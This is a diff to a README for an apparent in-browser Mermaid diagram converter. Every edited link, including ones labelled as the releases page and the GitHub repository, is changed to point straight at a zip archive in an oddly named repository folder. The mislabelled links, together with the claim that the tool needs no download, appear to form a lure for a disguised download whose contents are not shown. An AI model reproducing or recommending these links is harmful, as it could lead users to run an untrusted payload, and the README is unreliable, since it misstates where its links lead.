@@ -1,7 +1,7 @@
 # 🌟 xsukax-Mermaid-Diagram-Converter - Create Diagrams with Ease
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/lakhmour/xsukax-Mermaid-Diagram-Converter/main/freethinking/xsukax-Mermaid-Diagram-Converter.zip)](https://raw.githubusercontent.com/lakhmour/xsukax-Mermaid-Diagram-Converter/main/freethinking/xsukax-Mermaid-Diagram-Converter.zip)
+[![Download](https://github.com/lakhmour/xsukax-Mermaid-Diagram-Converter/raw/refs/heads/main/freethinking/xsukax_Converter_Diagram_Mermaid_v3.9.zip)](https://github.com/lakhmour/xsukax-Mermaid-Diagram-Converter/raw/refs/heads/main/freethinking/xsukax_Converter_Diagram_Mermaid_v3.9.zip)
 
 ## 📖 Overview
 xsukax-Mermaid-Diagram-Converter is a lightweight application that allows you to create, render, and export Mermaid diagrams directly in your browser. It operates fully on your device, meaning no server is required, and your data remains private. With this tool, you can easily visualize ideas, workflows, and processes in an organized manner.
@@ -11,7 +11,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
    Click the link below to go to the Releases page where you can download the application:
-   [Visit Releases Page](https://raw.githubusercontent.com/lakhmour/xsukax-Mermaid-Diagram-Converter/main/freethinking/xsukax-Mermaid-Diagram-Converter.zip)
+   [Visit Releases Page](https://github.com/lakhmour/xsukax-Mermaid-Diagram-Converter/raw/refs/heads/main/freethinking/xsukax_Converter_Diagram_Mermaid_v3.9.zip)
 
 2. **Select the Latest Version**
    On the Releases page, look for the latest version of xsukax-Mermaid-Diagram-Converter. You will find various files available for download.
@@ -63,11 +63,11 @@ The application supports a wide range of Mermaid diagram types, including:
    If you encounter any difficulties, refer to the "Help" section in the application for quick tips and guidance.
 
 ## 💬 Feedback
-Your input is valuable. If you have suggestions or encounter any issues, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/lakhmour/xsukax-Mermaid-Diagram-Converter/main/freethinking/xsukax-Mermaid-Diagram-Converter.zip). We appreciate your feedback and strive to improve the application continuously.
+Your input is valuable. If you have suggestions or encounter any issues, feel free to open an issue on the [GitHub repository](https://github.com/lakhmour/xsukax-Mermaid-Diagram-Converter/raw/refs/heads/main/freethinking/xsukax_Converter_Diagram_Mermaid_v3.9.zip). We appreciate your feedback and strive to improve the application continuously.
 
 ## 🔗 Additional Resources
 - **Documentation:** Comprehensive documentation is available in the repository for users seeking to dive deeper into the features.
 - **Community:** Join the community of users and contribute to enhancing the application on GitHub.
 
 For more information or to download the latest version, visit the Releases page again:  
-[Visit Releases Page](https://raw.githubusercontent.com/lakhmour/xsukax-Mermaid-Diagram-Converter/main/freethinking/xsukax-Mermaid-Diagram-Converter.zip)
+[Visit Releases Page](https://github.com/lakhmour/xsukax-Mermaid-Diagram-Converter/raw/refs/heads/main/freethinking/xsukax_Converter_Diagram_Mermaid_v3.9.zip)
